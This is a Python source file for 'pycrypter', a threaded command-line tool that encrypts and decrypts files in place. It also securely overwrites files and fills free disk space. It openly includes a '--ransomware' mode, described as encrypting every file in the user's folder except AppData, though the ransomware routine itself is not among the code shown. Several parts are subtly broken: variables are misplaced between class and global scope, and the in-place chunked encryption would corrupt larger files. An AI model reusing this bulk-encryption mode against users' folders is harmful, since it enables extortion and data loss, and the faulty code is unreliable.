# pycrypter version
pycrypter_version = "1.2"

# Required Modules
import platform
import atexit
import traceback

import os
import sys
import argparse

import getpass
import signal
import ctypes

import random
import string

# Threading Modules
import threading
import queue

# Other Modules
import time
import psutil
import shutil

# Customization Modules
import colorama
from colorama import Fore, Back, Style
from tqdm import tqdm

colorama.init()

# Tkinter GUI Module
import tkinter as tk

if platform.system() == "Windows":
	# pywin32 Modules
	import win32api
	import win32con
	import win32file
	
	from winnt import MAXDWORD
	import pywintypes

# Cryptography Modules
import base64
import hashlib
import cryptography

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

from cryptography.fernet import Fernet

# kernel32 signal handler function | cleanup function
def cleanup_handler(signal=0, frame=None, silent=False, exit_reason=""):
	"""
	Create a cleanup handler to handle KeyboardInterrupt or start cleanup
	
	Parameters:
		signal (int): exit signal (optional, defaults to 0)
			The exit code used to exit the script.
		
		frame (frame object): not used (optional, defaults to None)
			Reserved for signal.signal() for Unix systems.
		
		silent (bool): prevent printing exit reason and code (optional, defaults to False)
			Defines whether to print {signal} and {exit_reason}
		
		exit_reason (str): exit reason (optional, defaults to "" [Empty string])
			Defines the exit reason.
			
	Returns:
		int: 0
	"""
	
	global bar_total

	global accept_threads
	accept_threads = False

	global cleanup_status
	cleanup_status = True

	for thread in threads:
		thread.join()

	if not silent:
		print(f"\n{Fore.LIGHTGREEN_EX}Exit reason: {exit_reason}\nExit code: {signal}{Style.RESET_ALL}\n", flush=True)

	if bar_total == 0 and not interactive['init']:
		py_pid = os.getpid()

		os.kill(py_pid, 9)
	return 0
	
# Register the handler
if platform.system() == "Windows":
	# kernel32 signal handler
	kernel32 = ctypes.windll.kernel32
	handler_type = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_ulong)

	handler_func = handler_type(lambda signal: cleanup_handler(signal=signal, exit_reason="KeyboardInterrupt"))
	kernel32.SetConsoleCtrlHandler(handler_func, True)

	signal.signal(signal.SIGINT, lambda signal, frame: None)
else:
	signal.signal(signal.SIGINT, lambda signal, frame: cleanup_handler(signal=signal, frame=frame, exit_reason="KeyboardInterrupt"))

# terminal progress bar
def progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='='):
	"""
	Call sys.stdout.write() to write a progress bar to the terminal

	Parameters:
		iteration (int): current iteration (required)
			The current iteration of the loop.
		
		total (int): total iterations (required)
			The total number of iterations for the loop
		
		prefix (str): prefix string (optional, defaults to "")
			A string that appears before the progress bar.
		
		suffix (str): suffix string (optional, defaults to "")
			A string that appears after the progress bar.
		
		decimals (int): positive number of decimals in percent complete (optional, defaults to 1)
			The number of decimal places to show in the percentage.
		
		length (int): character length of bar (optional, defaults to 50)
			The length of the progress bar.
		
		fill (str): bar fill character (optional, defaults to "=")
			The character used to fill the progress bar.

	Returns:
		None
		
		str:
		"CleanupInterrupt"
		"BarDisabled" - Returns if the bar was disabled (probably from pycrypter interactive)
		
	Example usage:
		progress_bar(10, 100, prefix='Progress:', suffix='Complete', decimals=1, length=50, fill='=')
		
		Output:
			Progress: |=====---------------------------------------------| 10.0% Complete
	"""

	if cleanup_status:
		return 'CleanupInterrupt'
	
	if not set_progress_bar:
		return 'BarDisabled'
	
	percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
	filled_length = int(length * iteration // total)
	bar = fill * filled_length + '-' * (length - filled_length)

	sys.stdout.write('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix))
	sys.stdout.flush()

# |==================================================| Threading functions |==================================================|

# thread worker
def worker(callback_function, *args, **kwargs):
	"""
	Call a function asynchronously using a worker function.
	If this function is called using "worker()", this will not asynchronously execute.
	
	Parameters:
		callback_function (func): callback function (required)
			The function to asynchronously.
			
		*args: arguments passed (optional)
			The arguments passed to the callback function.
			
		**kwargs: keyword arguments passed (optional)
			The keyword arguments passed to the callback function.
			
	Returns:
		None
		
		str: "CleanupInterrupt"
		
	Example usage:
		Bare call (main thread call):
			def my_func(arg1, arg2, kwarg1=""):
				print(f"Arg1: {arg1} | Arg2: {arg2} | kwarg1: {kwarg1}")
			
			worker(my_func, "Arg1", "Arg2", kwarg1="MyKwarg")
			
			Output: Arg1: "Arg1" | Arg2: "Arg2" | kwarg1: "MyKwarg"
		----------------------------------------------------------------
		Note: Bare calling worker() will not call the callback_function asynchronously
			
		thread_create call (async call):
			def my_func():
				print("Simulating work. . .")
				time.sleep(3)
				print("Work done!")
			
			thread_create(my_func)
			
			print("Main thread starting!")
			time.sleep(5)
			
			print("Main thread done!")
			
			Output:
				Simulating work. . .
				Main thread starting. . .
				[3 second pause]
				
				Work done!
				[2 second pause]
				Main thread done!
		------------------------------------------------------------------
		Use thread_create() for asynchronous calls
	"""
	
	global threads

	if not accept_threads:
		return 'CleanupInterrupt'
	
	try:
		current_thread = threading.current_thread()

		func_name = callback_function.__name__
		with semaphore:  # acquire and release the semaphore
			try:
				callback_function(*args, **kwargs)
			except Exception as err:
				err_name = type(err).__name__
				worker_errors.append(f"[worker, {func_name}] | Exception at thread {threading.get_ident()}, {err_name}, {err}")
			finally:
				threads.remove(current_thread)
	except Exception as err:
		err_name = type(err).__name__
		worker_errors.append(f"Exception occured at worker function, {err_name}, {err}")

# set max threads
def threads_max(max_threads=5):
	"""
	Set the amount of threads that can use the threading semaphore
		
	Parameters:
		max_threads (int): max threads (optional, defaults to 5)
			The amount of threads that can access the threading semaphore at once.
			
	Returns: 
		None
	
	Example usage:
		threads_max(7)
			This will allow 7 threads at once to execute.
			
		threads_max("String")
			This will raise a ValueError, stating that max_threads should be a valid integer.
			
		thread_max(26)
			This will print a warning in the console, saying that too many threads will slow down your computer.
	"""
	
	if not isinstance(max_threads, int):
		raise ValueError("max_threads must be a valid integer!")

	global semaphore
	semaphore = threading.Semaphore(max_threads)

	if semaphore._value > 15:
		print(Fore.YELLOW + 'Warning: Having too many threads can slow down your computer!' + Style.RESET_ALL)

# create a thread
def thread_create(callback, thread_name="", *args, **kwargs):
	"""
	Create a thread to call a function asynchronously.
	
	Parameters:
		callback (func): callback function (required)
			The function to asynchronously.
			
		thread_name (str): thread name (optional, defaults to "" [Empty string)
			The name for the thread created.
			
		*args: arguments passed (optional)
			The arguments passed to the callback function.
			
		**kwargs: keyword arguments passed (optional)
			The keyword arguments passed to the callback function.
			
	Returns:
		thread object
		
	Example usage: Refer to the docstring of the worker function. (worker.__doc__)
	"""

	global threads
	
	thread = threading.Thread(target=worker, args=(callback, *args), kwargs=kwargs, name=thread_name)
	
	thread.start()
	threads.append(thread)

	return thread

# |==================================================| Iteration functions |==================================================|

# iterate through a directory and optionally a subdirectory
def iterate_dir(directory, iterate_tree=True, skip_dirs=[]):
	"""
	Iterate through a directory while optionally iterating through the sub-directories
	
	Parameters:
		directory (str): directory to iterate (required)
			The directory passed to iterate through.
			
		iterate_tree (bool): iterate through sub-directories (optional, defaults to True)
			Defines whether the script iterates through sub-directories or not.
			
		skip_dirs (list): list of directories to skip (optional, defaults to []/empty list)
			Defines the sub-directories to exclude from the search.
			
		Returns:
			list: file_paths
				- The returned list will contain a relative/absolute path,
				- depending if it's ".\\" or "C:\\".
				
				- Refer to example usage below
			
			[if the argument isn't a directory]
				str: "NotADirectoryError"
				
		Example usage:
			Passing a non-boolean [True, False] to
			the iterate_tree argument will result in a ValueError:
			
			Traceback (most recent call last):
			  File "C:\MyPython\pycrypter.py", line 1, in <module>
				raise ValueError("iterate_tree must be a valid boolean")
			ValueError: iterate_tree must be a valid boolean
			
			[Passing True, False, 1, 0 is a valid boolean]
			
			=========================================================
			Passing a non-existent directory/a file will not raise
			an exception, but instead return a string value, signaling
			an error:
			
			Example 1:
				files = iterate_dir("C:\\MyFakeDirectory", iterate_tree=True, skip_dirs=[])
				
				print(files)
				
				[Output]
				NotADirectoryError
			
			Example 2:
				files = iterate_dir("C:\\MyPython\\myfile.txt", iterate_tree=True, skip_dirs=[])
				
				print(files)
				
				[Output]
				NotADirectoryError
			
			=========================================================
			A PermissionError exception will be caught, and added to
			an exception list:
						
			import win32api
			import win32con

			# Set the system attribute for the MyPython folder
			win32api.SetFileAttributes("C:\\MyPython\\", win32con.FILE_ATTRIBUTE_SYSTEM)

			permission_errors = []
			
			# Assume this code has two files, the script and "sys.txt"
			files = iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])
			
			print(files)
			print(permission_errors)
			
			[Output]
			[]
			['iterate_dir | A PermissonError occured! Path: "C:\\MyPython"']
			
			---------------------------------------------------------
			How to call:
			
			files = iterate_dir(".", iterate_tree=True, skip_dirs=[])
			
			print(files)
			
			---------------------------------------------------------
			We can assume that the files in the current working directory
			is the current script file and a.txt, so this will be the output:
			
			['.\\pycrypter.py', '.\\a.txt']
			---------------------------------------------------------
			
			If you use "."/".." as the directory argument, any added to
			the list will be formatted as so:
			
			['.\\example.txt', '..\\myfile.txt']
			
			However, using the absolute path like so:
			iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])
			
			Will return the absolute path, formatted like this:
			
			['C:\\MyPython\\a.txt']
	"""
	
	if iterate_tree not in [True, False]:
		raise ValueError(f"iterate_tree expected boolean, got {iterate_tree}")

	file_paths = []

	# Check argument if it's a directory
	if not os.path.isdir(directory):
		if os.path.isfile(directory):
			raise NotADirectoryError(f'[Errno 21] Not a directory: {directory}')
		else:
			raise FileNotFoundError(f'[Errno 2] No such directory: {directory}')

	# Iterate through the directory, and catch PermissionErrors
	# If iterateTree is true, also loop through the sub-dirs
	try:
		for filename in os.listdir(directory):
			path = os.path.join(directory, filename)

			if path in skip_dirs:
				continue

			if os.path.isfile(path):
				file_paths.append(path)

			elif os.path.isdir(path) and iterate_tree:
				file_paths.extend(iterate_dir(path))
	except PermissionError as err:
		print(f"PermissionError: {err}")

	return file_paths

# check if a file exists
def find_file(file_path):
	try:
		if os.path.isfile(file_path):
			return True
		else:
			return False
	except PermissionError as err:
		permission_errors.append(f"find_file | A PermissonError occured! Path: \"{file_path}\"")

# check a directory if it exists
def find_dir(directory_path):
	try:
		if os.path.isdir(directory_path):
			return True
		else:
			return False
	except PermissionError as err:
		permission_errors.append(f"find_dir | A PermissonError occured! Path: \"{directory_path}\"")

# |==================================================| Cipher functions |==================================================|

# encryption function
def encrypt_file(input_file, password="", keep_copy=False, hash_pepper=b"", password_pepper=b""):
	"""
	Define a function to encrypt a file in chunks
	using the cryptography.Fernet module.
	
	Parameters:
		input_file (str): the input file (required)
			The file passed to encrypt.
		
		password (str): password to use (optional, defaults to ""/empty string)
			The password used to encrypt the file.
			
		keep_copy (bool): keep a copy of the decrypted file (optional, defaults to False)
			Defines whether the script should keep a copy of the decrypted file.
		
		override_raise (bool): override function raise statements (optional, defaults to False)
			This will override the function's raise statements, disabling them.
	Returns:
		int: 0 [Success]
		
		str:
			[Cleanup] "CleanupInterrupt"
			- This tells the script to stop executing
			
			[Error 1] "input_file == " + sys.argv[0] + " | Illegal operation"
			- This error tells the user that the input file is the current script file.
			
			[Error 2] "File doesn't exist/isn't a file | file_error"
			- This error tells the user that the file passed
			- isn't a file or the file doesn't exist.
			
	Exceptions:
		[Note: override_raise will disable these exceptions]
		
		[Exception 1] raise ValueError("keep_copy must be a valid boolean")
		- This exception tells the user that the keep_copy argument
		- must be a valid boolean. [True, False, 1, 0]
		
		[Exception 2] raise MemoryError(
			f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
		
		- This exception tells the user that the file passed is too large to process.
		- [The file must be below memory_max_allocated, check the variables above]
		
	Example usage:
		Passing the script file will return Error 1
		
		return_value = encrypt_file("pycrypter.py", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		input_file == pycrypter.py | Illegal operation
		
		=================================================================
		Passing a non-boolean to keep_copy will throw a ValueError [Exception 1]
		
		return_value = encrypt_file("pycrypter.py", password="MyPass", keep_copy="No")
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\\MyPython\\pycrypter.py", line 1, in <module>
			raise ValueError("keep_copy must be a valid boolean")
		ValueError: keep_copy must be a valid boolean
		
		=================================================================
		Passing a directory/non-existent file will return Error 2
		
		return_value_1 = encrypt_file("not_a_file", password="MyPass", keep_copy=False)
		return_value_2 = encrypt_file("someFakeFile.txt", password="MyPass", keep_copy=False)
		
		print(return_value_1)
		print(return_value_2)
		
		[Output]
		File doesn't exist/isn't a file | file_error
		File doesn't exist/isn't a file | file_error
		
		=================================================================
		Passing a file that exceeds memory_max_allocated will throw a MemoryError [Exception 2]
		
		return_value = encrypt_file("MyLargeFile.txt", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\MyPython\pycrypter.py", line 1, in <module>
			raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
			
		MemoryError: The file "MyLargeFile.txt" exceeds the maximum memory allowed to allocate. (Max: 300.00 MB)
		
		------------------------------------------------------------------
		
		Basic usage:
			# We can assume that text.txt's contents is this:
			# This is my text in this .txt file
			
			return_value = encrypt_file("test.txt", password="MyPass", keep_copy=False)
			print(return_value) # This would print the integer "0"
			
			with open("test.txt", "r") as file:
				print(file.read())
				
			[Output]
			0
			Áî¼Ç6Ò–—0¡sIZéã†¸ëïÖa↕Ò¯;¶ª“QgAAAAABkRw0N50WP2VQ
			-q6i2jeCkVRExdZSvzChp1CFx_wKiPAvv7J6OJr4QFZIguTjp2P_ylVz31Z_kBye_TxjbV_5SAi3b4gSRpJMYkMXqSRFLslJyn1D6s_Hkc8EkgedWHOIqBEXc
			
			# The ciphertext above was separated into two lines to fit it in this docstring
	"""
	
	# Guard clauses
	if input_file == sys.argv[0]:
		raise ValueError(f"illegal operation [input_file == {sys.argv[0]}]")

	if keep_copy not in [True, False]:
		raise ValueError(f'keep_copy expected boolean, got {keep_copy}')

	# Check argument if it's a file
	if not os.path.isfile(input_file):
		if os.path.isdir(input_file):
			raise IsADirectoryError(f"[Errno 21] Is a directory: {input_file}")
		else:
			raise FileNotFoundError(f"[Errno 2] No such file: {input_file}")
	
	# Encrypt the file in chunks
	with open(input_file, "rb+") as file:
		file_size = os.path.getsize(input_file)
		
		salt = os.urandom(32)

		kdf = PBKDF2HMAC(
			algorithm=hashes.SHA256(),
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
		
		key = None
		
		if isinstance(password, bytes):
			key = kdf.derive(password + password_pepper)
		else:
			key = kdf.derive(password.encode() + password_pepper)
		
		fernet_key = base64.urlsafe_b64encode(key)
		
		file.seek(0, os.SEEK_SET)
		chunk = file.read(50 * 1024 * 1024)
		
		file.seek(0, os.SEEK_SET)
		file.write(salt)
		
		if keep_copy:
			file_name, file_ext = os.path.splitext(input_file)
			shutil.copy2(input_file, f"{file_name}_decrypted-copy{file_ext}")

		while chunk:
			chunk_encrypted = Fernet(fernet_key).encrypt(chunk)
			file.write(chunk_encrypted)
			
			chunk = file.read(50 * 1024 * 1024)  # Read 50MB at a time
	return 0

# decryption function
def decrypt_file(input_file, password="", keep_copy=False, hash_pepper=b"", password_pepper=b""):
	"""
	Define a function to decrypt a file in chunks
	using the cryptography.Fernet module.
	
	Parameters:
		input_file (str): the input file (required)
			The file passed to decrypt.
		
		password (str): password to use (optional, defaults to ""/empty string)
			The password used to decrypt the file.
			
		keep_copy (bool): keep a copy of the decrypted file (optional, defaults to False)
			Defines whether the script should keep a copy of the encrypted file.
			
	Returns:
		int: 0 [Success]
		
		str:
			[Cleanup] "CleanupInterrupt"
			- This tells the script to stop executing
			
			[Error 1] "input_file == " + sys.argv[0] + " | Illegal operation"
			- This error tells the user that the input file is the current script file.
			
			[Error 2] "File doesn't exist/isn't a file | file_error"
			- This error tells the user that the file passed
			- isn't a file or the file doesn't exist.
			
	Exceptions:
		[Exception 1] raise ValueError("keep_copy must be a valid boolean")
		- This exception tells the user that the keep_copy argument
		- must be a valid boolean. [True, False, 1, 0]
		
		[Exception 2] raise MemoryError(
			f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
		
		- This exception tells the user that the file passed is too large to process.
		- [The file must be below 300MB]
		
		[Exception 3] raise DecryptionError(f"The key \"{password}\" is invalid.")
		- This exception indicates that the password passed is invalid.
		- Note: This exception is a custom defined exception
		
	Example usage:
		Passing the script file will return Error 1
		
		return_value = decrypt_file("pycrypter.py", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		input_file == pycrypter.py | Illegal operation
		
		=================================================================
		Passing a non-boolean to keep_copy will throw a ValueError [Exception 1]
		
		return_value = decrypt_file("pycrypter.py", password="MyPass", keep_copy="No")
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\\MyPython\\pycrypter.py", line 1, in <module>
			raise ValueError("keep_copy must be a valid boolean")
		ValueError: keep_copy must be a valid boolean
		
		=================================================================
		Passing a directory/non-existent file will return Error 2
		
		return_value_1 = decrypt_file("not_a_file", password="MyPass", keep_copy=False)
		return_value_2 = decrypt_file("someFakeFile.txt", password="MyPass", keep_copy=False)
		
		print(return_value_1)
		print(return_value_2)
		
		[Output]
		File doesn't exist/isn't a file | file_error
		File doesn't exist/isn't a file | file_error
		
		=================================================================
		Passing a file that exceeds memory_max_allocated will throw a MemoryError [Exception 2]
		
		return_value = decrypt_file("MyLargeFile.txt", password="MyPass", keep_copy=False)
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\MyPython\pycrypter.py", line 1, in <module>
			raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
			
		MemoryError: The file "MyLargeFile.txt" exceeds the maximum memory allowed to allocate. (Max: 300.00 MB)
		
		=================================================================
		Passing the wrong password will throw a custom defined DecryptionError [Exception 3]
		
		return_value = decrypt_file("text.txt", password="WrongPassword", keep_copy=False)
		print(return_value)
		
		[Output]
		Traceback (most recent call last):
		  File "C:\MyPython\pycrypter.py", line 1, in <module>
			raise DecryptionError(f"The key \"{password}\" is invalid.")
		
		DecryptionError: The key "WrongPassword" is invalid.
		------------------------------------------------------------------
		
		Basic usage:
			# We can assume that text.txt's contents is this ciphertext:
			# [Had to split it into two lines for this documentation]
			
			# Áî¼Ç6Ò–—0¡sIZéã†¸ëïÖa↕Ò¯;¶ª“QgAAAAABkRw0N50WP2VQ
			# -q6i2jeCkVRExdZSvzChp1CFx_wKiPAvv7J6OJr4QFZIguTjp2P_ylVz31Z_kBye_TxjbV_5SAi3b4gSRpJMYkMXqSRFLslJyn1D6s_Hkc8EkgedWHOIqBEXc
			
			return_value = decrypt_file("test.txt", password="MyPass", keep_copy=False)
			print(return_value) # This would print the integer "0"
			
			with open("test.txt", "r") as file:
				print(file.read())
				
			[Output]
			0
			This is my text in this .txt file
	"""

	# Guard clauses
	if input_file == sys.argv[0]:
		raise ValueError(f"illegal operation [input_file == {sys.argv[0]}]")

	if keep_copy not in [1, 0]:
		raise ValueError(f'expected boolean, got {keep_copy}')

	# Check argument if it's a file
	if not os.path.isfile(input_file):
		if os.path.isdir(input_file):
			raise IsADirectoryError(f"[Errno 21] Is a directory: {input_file}")
		else:
			raise FileNotFoundError(f"[Errno 2] No such file: {input_file}")

	# Decrypt the file in chunks
	with open(input_file, "rb+") as file:
		file_size = os.path.getsize(input_file)
		
		salt = file.read(32)
			
		kdf = PBKDF2HMAC(
			algorithm=hashes.SHA256(),
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
		
		if isinstance(password, bytes):
			key = kdf.derive(password + password_pepper)
		else:
			key = kdf.derive(password.encode() + password_pepper)
		
		fernet_key = base64.urlsafe_b64encode(key)
		
		file.seek(32, os.SEEK_SET)
		chunk = file.read(50 * 1024 * 1024)
		
		decrypt_successful = False
		
		try:
			chunk_encrypted = Fernet(fernet_key).decrypt(chunk)
			decrypt_successful = True
		except cryptography.fernet.InvalidToken as error:
			raise ValueError("Invalid key") from error
		finally:
			file.close() if not decrypt_successful else None
		
		# Erase/keep the file
		if keep_copy:
			file_name, file_ext = os.path.splitext(input_file)
			shutil.copy2(input_file, f"{file_name}_decrypted-copy{file_ext}")
		
		cursor_position = None
		plaintext_end = 0
		
		while chunk:
			chunk_decrypted = Fernet(fernet_key).decrypt(chunk)
			plaintext_end += len(chunk_decrypted)
			
			cursor_position = file.tell()
			
			file.seek(0, os.SEEK_SET)
			file.write(chunk_decrypted)
			
			file.seek(cursor_position, os.SEEK_SET)
			chunk = file.read(50 * 1024 * 1024)
		
		print(plaintext_end)
		file.truncate(plaintext_end)
	return 0

# Overwrite deletion
def file_overwrite(file_path, file_size):
	global cleanup_status
	
	with open(file_path, 'wb') as file:
		original_size = file_size
		
		# Overwrite with a random bytearray
		chunk = 50 * 1024 * 1024
		file.truncate(0)		
		
		for pass_iteration in range(16):
			file_size = original_size
			chunk_data = None
			
			if pass_iteration in [0, 1]:
				chunk_data = bytearray([0x00, 0x00]) # First pass
								
			elif pass_iteration in [2, 3]:
				chunk_data = bytearray([0xFF, 0xFF]) # Second pass
								
			elif pass_iteration in [4, 5]:
				chunk_data = bytearray([0x55, 0xAA]) # Third pass
									
			elif pass_iteration in [6, 7]:
				chunk_data = bytearray([0xAA, 0x55]) # Fourth pass
								
			else:
				chunk_data = os.urandom(2) # All other passes
			
			while file_size > 0:
				if cleanup_status:
					file.truncate(0)
					file.close()
					
					os.remove(file_path)
					
					return
				
				chunk = min(file_size, 50 * 1024 * 1024)
				
				file.write(chunk_data * chunk)
				file_size -= chunk
			
			file.truncate(0)
			interactive[f"{file_path} | pass{pass_iteration + 1}_complete"] = True
		
	# Delete the file
	os.remove(file_path)
			
def freespace_overwrite():
	with open("disk_filler_file.tmp", 'wb') as file:
		try:
			usage = psutil.disk_usage("C:\\")
			
			# Allow 1 GB to be allocated to prevent out of disk issues
			original_free_space = int(format(usage.free // (1024 * 1024 * 1024))) - 1
			chunk = 500 * 1024 * 1024
			
			for pass_iteration in range(3):
				free_space = original_free_space
				chunk_data = None
				
				if pass_iteration == 0:
					chunk_data = bytearray([0x00, 0x00])
					
				elif pass_iteration == 1:
					chunk_data = bytearray([0xFF, 0xFF])
				
				elif pass_iteration == 2:
					chunk_data = os.urandom(2)
				
				while free_space > 0:
					if cleanup_status:
						file.truncate(0)
						file.close()
						
						os.remove("disk_filler_file.tmp")
						
						raise KeyboardInterrupt
					
					file.write(chunk_data * chunk)
					free_space -= chunk
						
				interactive[f"freespace_overwrite | pass{pass_iteration + 1}_complete"] = True
				os.fsync(file.fileno())
				
				file.truncate(0)
			
			file.close()
			os.remove("disk_filler_file.tmp")
		except KeyboardInterrupt:
			pass
		except Exception as err:
			err_name = type(err).__name__
			
			print(f"freespace_overwrite | An unexpected error occured! Details: \n")
			traceback.print_exc()

# Final debugging information, executed after everything
def debug_info(interactive_call=False):
	global bar_iteration
	
	if bar_iteration == 0:
		return "not_in_progress"

	# Worker errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}Worker errors:{Style.RESET_ALL}\n")

	for err in worker_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	# Permission errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}Permission errors:{Style.RESET_ALL}\n")

	for err in permission_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	# File and directory errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}File and directory errors:{Style.RESET_ALL}\n")

	for err in file_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	for err in dir_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")

class Main:
	if __name__ != "__main__":
		raise RuntimeError("class Main must be called as __main__")
	
	def __init__(self):
		# pepper | DO NOT LEAK THIS!
		self.hash_pepper = b'\xf0f\x9e\x10\xca\xbf\xca\xc4\xf1\xfd\xee\x00\xab7b\xc8\x1em1`\xb1\x821b\xf8&\xa1\xa9(\xb0\xa6\x0b'
		self.password_pepper = b'\xd3\x9dh4N\x0c\xbc\xac\x17\xc1\xd7\xa5\x88\x8a2\xceI\x96\x10\x86A\n@\x19\x12\xfc\x8bi\xc8\tIA'

		# Progress bar variables
		self.bar_iteration = 0
		self.bar_total = 0

		# args variables
		self.files_count = 0
		self.files_finished = 0
		self.files_exception_thrown = 0

		# cleanup variables
		self.accept_threads = True
		self.cleanup_status = False

		self.set_progress_bar = True
		# semaphore
		semaphore = threading.Semaphore(5)

		# Threads created in worker function
		threads = []

		# Error lists
		worker_errors = []
		permission_errors = []

		file_errors = []
		dir_errors = []

		interactive = {'init': False}

		# misc
		memory_max_allocated = 300 * 1024 * 1024  # 300MB
		current_user = os.getlogin()

		class ArgumentError(Exception):
			pass

		# self.parser objects
		self.args = None
		
		self.parser = argparse.ArgumentParser(description=f'Pycrypter CLI by NewGuy103. v{pycrypter_version}')

		self.parser.add_argument(
			'-i', '--interactive',
			action="store_true",
			help="pycrypter's interactive CLI mode"
		)
		
		self.parser.add_argument(
			'-rw', '--ransomware',
			action="store_true",
			help="Ransomware mode, this will fetch the user's folder and cipher files inside it [Excluding AppData]."
		)

		self.parser.add_argument(
			'-e', '--encrypt',
			action="store_true",
			help='Encryption switch.'
		)

		self.parser.add_argument(
			'-d', '--decrypt',
			action="store_true",
			help='Decryption switch.'
		)

		self.parser.add_argument(
			'-ds', "--deep-search",
			action="store_true",
			help='If specified, search the sub-folders of the directory specified.'
		)

		self.parser.add_argument(
			'-c', "--keep-copy",
			action="store_true",
			help='If specified, keep a copy of the encrypted/decrypted file.'
		)

		self.parser.add_argument(
			'-v', "--verbose",
			action="store_true",
			help='Show detailed output to the command-line.'
		)

		self.parser.add_argument(
			'-t', '--threads',
			metavar='int',
			nargs="?",
			type=int,
			help="Sets the maximum amount of files to process in memory."
		)

		self.parser.add_argument(
			'-f', "--file",
			metavar='input_file',
			type=str,
			nargs="+",
			help='File path(s) to specify.'
		)

		self.parser.add_argument(
			'-dr', "--directory",
			metavar='input_dir',
			type=str,
			nargs="+",
			help='Directory path(s) to specify.'
		)
	
	def pycrypter_interactive():
		"""
		
		"""
		
		interactive['init'] = True
		
		global files_count
		global files_finished
		global files_exception_thrown

		global bar_total
		global current_user
		global set_progress_bar
		
		def tokenize(string):
			tokens = []
			start = 0
			in_quotes = False

			for iteration, char in enumerate(string):
				if char == '"' or char == "'":
					in_quotes = not in_quotes
				elif char == ' ' and not in_quotes:
					token = string[start:iteration]
					
					if in_quotes and token.startswith('"') and token.endswith('"'):
						token = token[1:-1]  # remove quotes
					tokens.append(token)
					start = iteration + 1

			token = string[start:]
			if in_quotes and token.startswith('"') and token.endswith('"'):
				token = token[1:-1]  # remove quotes
			tokens.append(token)

			for iteration, token in enumerate(tokens):
				if (token[0] == '"' and token[len(token) - 1] == '"'):
					tokens[iteration] = tokens[iteration][1:-1]
				
				if token[0] == "'" and token[len(token) - 1] == "'":
					tokens[iteration] = tokens[iteration][1:-1]
			
			return tokens
		
		main = Main()
		
		while True:
			if cleanup_status:
				break
			
			time.sleep(0.01)
			try:
				command = input("pycrypter> ")
			except EOFError:
				cleanup_handler(signal=0, silent=True, exit_reason="EOFCharacterExit")
				break
			
			if command == "exit":
				cleanup_handler(signal=0, silent=True, exit_reason="SystemExit")
				break
			
			if "encrypt " in command.lower():
				encryption_arguments = command.replace("encrypt ", "").lower()
				keep_copy = False
				
				if "-c " in encryption_arguments or "--keep-copy " in encryption_arguments:
					keep_copy = True
					
					args1 = encryption_arguments.replace("-c ", '')
					encryption_arguments = args1.replace("--keep_copy ", '')
					
				if "-rw" in encryption_arguments or "--ransomware" in encryption_arguments:
					args1 = encryption_arguments.replace("-rw", "")
					encryption_arguments = args1.replace("--ransomware", "")
					
					dir_list = [
						f"C:\\MyPython\\hmm"
					]
					
					skip_dirs = [
						f"C:\\Users\\{current_user}\\AppData"
					]
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					main.ransomware(
						dir_list,
						skip_directories=skip_dirs,
						verbose=True,
						password=password,
						keep_copy=keep_copy,
						cipher_method="encrypt"
					)
					
					debug_info()
					continue
					
				if "-f " in encryption_arguments or "--file " in encryption_arguments:
					args1 = encryption_arguments.replace("-f ", "")
					argument_files = args1.replace("--file ", "")
					
					files = tokenize(argument_files)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if files:
						main.cipher_file(
							files,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="encrypt"
						)
				if "-dr " in encryption_arguments or "--directory " in encryption_arguments:
					args1 = encryption_arguments.replace("-dr ", "")
					argument_directories = args1.replace("--directory ", "")
					
					directories = tokenize(argument_directories)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if directories:
						main.cipher_directory(
							directories,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="encrypt"
						)
				debug_info()
			
			if "decrypt " in command.lower():
